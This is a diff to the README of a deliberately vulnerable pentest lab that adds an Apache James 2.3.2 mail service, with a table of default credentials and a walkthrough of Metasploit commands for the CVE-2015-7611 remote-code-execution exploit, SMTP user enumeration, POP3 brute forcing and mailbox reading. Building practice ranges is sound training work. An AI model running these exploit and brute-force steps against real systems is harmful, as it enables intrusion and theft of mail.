@@ -36,6 +36,10 @@ three IPs are what you scan. The loot refers to the boxes by the hostnames
 |             | SNMP (v2c)     | 161/udp   | community `public`/`private` | default SNMP community strings    |
 |             | Juniper SSG5   | 23/tcp    | `netscreen`/`netscreen` or CVE-2015-7755 | weak telnet creds + hardcoded backdoor |
 |             | LDAP           | 389/tcp   | `admin`/`ldapadmin`, anon bind  | anonymous enumeration + cleartext creds in description |
+|             | SMTP (James)   | 25/tcp    | `root`/`root` (admin)   | **CVE-2015-7611** path traversal → cron RCE |
+|             | POP3 (James)   | 110/tcp   | LDAP user list          | weak creds, brute-forceable            |
+|             | IMAP (James)   | 143/tcp   | LDAP user list          | weak creds, brute-forceable            |
+|             | James admin    | 4555/tcp  | `root`/`root`           | default admin creds → user mgmt        |
 | **app01**   | WordPress 4.6  | 80/tcp    | set during install      | outdated WP core/plugins (CVEs)        |
 |             | Tomcat Manager | 8080/tcp  | `tomcat` / `tomcat`     | default manager creds → WAR-to-shell   |
 |             | MySQL          | 3306/tcp  | `root` / `root`         | weak DB root creds                     |
@@ -93,6 +97,13 @@ into the right folder).
   ```bash
   sudo modprobe nfs nfsd
   echo -e "nfs\nnfsd" | sudo tee /etc/modules-load.d/nfs.conf   # persist on reboot
+  ```
+  The James mail container downloads the Apache James 2.3.2 binary at build time
+  so this VM also needs internet on first `up --build`. Stop any local MTA before
+  bringing James up so port 25 is free:
+  ```bash
+  sudo systemctl stop postfix exim4 2>/dev/null || true
+  sudo systemctl disable postfix exim4 2>/dev/null || true
   ```
 - All three VMs should sit on the **same LAN segment** as your Kali box.
 - **desk01:** its images build from local Dockerfiles, so that VM needs internet
@@ -163,10 +174,10 @@ docker compose up -d
 # DVWA: open http://<web01-ip>/setup.php and click Create/Reset Database
 ```
 
-**files01 VM** (after `modprobe nfs nfsd`):
+**files01 VM** (after `modprobe nfs nfsd` and stopping any local MTA):
 ```bash
 cd files01
-docker compose up -d
+docker compose up -d --build   # builds James (needs internet on first run)
 ```
 
 **app01 VM:**
@@ -282,6 +293,47 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   User bind DNs follow `uid=<username>,ou=Users,dc=corp,dc=local`. The `trogdon`
   and `dmudd` accounts discovered here are reused on app01's Brocade switch
   (credential reuse chain).
+
+- SMTP/POP3/IMAP — Apache James 2.3.2 (CVE-2015-7611, ports 25/110/143/4555):
+  ```bash
+  # version/banner grab
+  nmap -sV -p25,110,143,4555 <files01-ip>
+  use auxiliary/scanner/smtp/smtp_version
+
+  # admin console — default root/root
+  telnet <files01-ip> 4555
+  # login root root
+  # listusers
+  # adddomain / adduser / setpassword / quit
+
+  # CVE-2015-7611 — path traversal file write → cron.d → RCE within 60s
+  use exploit/linux/smtp/apache_james_exec
+  set RHOSTS <files01-ip>
+  set LHOST <kali-ip>
+  set SRVHOST <kali-ip>
+  # default target is Cron; payload runs within 60 seconds via cron
+  run
+
+  # SMTP user enumeration (VRFY/EXPN)
+  use auxiliary/scanner/smtp/smtp_enum
+  set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+  # jsmith, agarcia, backup, trogdon, dmudd are valid
+
+  # POP3 brute force with the found usernames
+  use auxiliary/scanner/pop3/pop3_login
+  set RHOSTS <files01-ip>
+  set USER_FILE /tmp/users.txt   # jsmith agarcia backup trogdon dmudd
+  set PASS_FILE /usr/share/wordlists/rockyou.txt
+
+  # Manual POP3 (read mail after exploitation)
+  telnet <files01-ip> 110
+  # USER jsmith
+  # PASS password123
+  # STAT / LIST / RETR 1 / QUIT
+  ```
+  Mail accounts share the same credentials as the LDAP users. The admin
+  portal (4555) accepts `root`/`root` by default — list/add/delete users
+  without any exploit needed.
 
 **app01**
 - Brocade FWS624 / ICX6450 (port 23):
